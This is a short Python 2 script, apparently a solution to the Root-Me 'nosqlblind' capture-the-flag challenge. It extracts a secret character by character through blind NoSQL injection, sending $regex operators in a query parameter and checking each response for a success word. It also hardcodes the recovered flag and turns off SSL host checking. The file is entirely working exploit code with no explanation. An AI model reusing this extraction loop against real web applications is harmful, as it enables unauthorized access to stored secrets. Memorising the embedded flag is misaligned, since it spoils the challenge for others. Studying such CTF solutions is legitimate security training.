import io
import re
import pycurl
import StringIO
from urllib import urlencode


def clear(o):
    o.truncate(0)
    o.seek(0)

body_buffer = StringIO.StringIO()
header_buffer = StringIO.StringIO()

def ok(res):
    return len(res.split('Yeah'))>1


c = pycurl.Curl()
c.setopt(c.SSL_VERIFYHOST, 0)
c.setopt(c.WRITEFUNCTION, body_buffer.write)
c.setopt(c.HEADERFUNCTION, header_buffer.write)

charset = [chr(i) for i in range(ord('0'),ord('9')+1)]
charset.extend([chr(i) for i in range(ord('A'),ord('Z')+1)])
charset.extend([chr(i) for i in range(ord('a'),ord('z')+1)])
charset.append('_')
charset.append('!')

passwd = '3@sY_n0_5q7_1nj3c710n'
passwd = ''

for j in range(21):
    remaining = 20-j
    for i in [chr(i) for i in range(33,128)]:
        if i != "#" and i != "&" and i != "." and i != "?" and i != "\\" and i != "$":
            c = pycurl.Curl()
            c.setopt(c.WRITEFUNCTION, body_buffer.write)
            c.setopt(c.HEADERFUNCTION, header_buffer.write)
            c.setopt(c.URL, 'http://challenge01.root-me.org/web-serveur/ch48/index.php?chall_name=nosqlblind&flag[$regex]=.{'+str(remaining)+'}'+i+passwd)
            c.perform()

            body = body_buffer.getvalue()
            header = header_buffer.getvalue()

            if ok(body):
                print(i)
                passwd = i+passwd
                clear(body_buffer)
                clear(header_buffer)
                break

    print(passwd)
